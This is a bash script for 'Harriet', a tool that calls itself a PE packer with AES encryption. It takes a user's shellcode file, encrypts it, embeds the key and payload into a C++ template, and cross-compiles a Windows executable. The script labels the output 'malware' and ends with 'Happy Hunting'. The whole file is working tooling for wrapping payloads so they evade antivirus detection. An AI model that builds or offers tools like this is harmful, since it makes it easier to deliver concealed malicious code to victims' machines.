#!/bin/bash

# Color variables
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
magenta='\033[0;35m'
cyan='\033[0;36m'
# Clear the color after that
clear='\033[0m'
cat << "EOF"
  __ _ ___ ___ _   _ _ __ ___   ___      | |__  _ __ ___  __ _  ___| |__  
 / _` / __/ __| | | | '_ ` _ \ / _ \_____| '_ \| '__/ _ \/ _` |/ __| '_ \ 
| (_| \__ \__ \ |_| | | | | | |  __/_____| |_) | | |  __/ (_| | (__| | | |
 \__,_|___/___/\__,_|_| |_| |_|\___|     |_.__/|_|  \___|\__,_|\___|_| |_|
                            
                                **Harriet**
                                
                       A PE Packer With AES Encryption
               
                   
 
EOF
echo -e ${green}"Enter A Random Word!"${clear}
echo ""
read Random1
echo""
echo -e ${green}"Enter A Random Word!"${clear}
echo ""
read Random2
echo ""
echo -e ${green}"Enter A Random Word!"${clear}
echo ""
read Random3
echo ""
echo -e ${green}"Enter The Path To Your Shellcode File. ex: /home/user/Downloads/shellcode.bin"${clear}
echo ""
read Shellcode
echo ""
echo -e ${green}"Name Your Malware! ex: malware.exe"${clear}
echo ""
read Random4
echo ""
cp ../template.cpp Resources/template.cpp
echo -e ${yellow}"Encrypting Payload" ${clear}
echo ""
sleep 2
python aesencrypt.py $Shellcode > shell.txt
echo -e ${yellow}"Encryption Completed"${clear}
echo ""
sed -i s/Random1/$Random1/g Resources/template.cpp

sed -i s/Random2/$Random2/g Resources/template.cpp

sed -i s/Random3/$Random3/g Resources/template.cpp

cp shell.txt shell2.txt

keys=$(cat "shell2.txt")
cut -d 'p' -f1 shell2.txt > shell3.txt
keys=$(cat shell3.txt)
keysnow=${keys#*=}
sed -i "s/KEYVALUE/$keysnow/g" Resources/template.cpp

payload=$(cat "shell.txt")
payloadnow=${payload#*;}
payloadtoday=${payloadnow#*=}
echo $payloadtoday > shell5.txt
perl -pe 's/PAYVAL/`cat shell5.txt`/ge' -i Resources/template.cpp
sleep 2
echo -e ${yellow}"Compiling Malware"${clear}
x86_64-w64-mingw32-g++ -o $Random4 Resources/template.cpp -fpermissive -Wno-narrowing >/dev/null 2>&1
echo ""
sleep 2
echo -e ${yellow}"Malware Compiled. Happy Hunting"${clear}
rm shell*
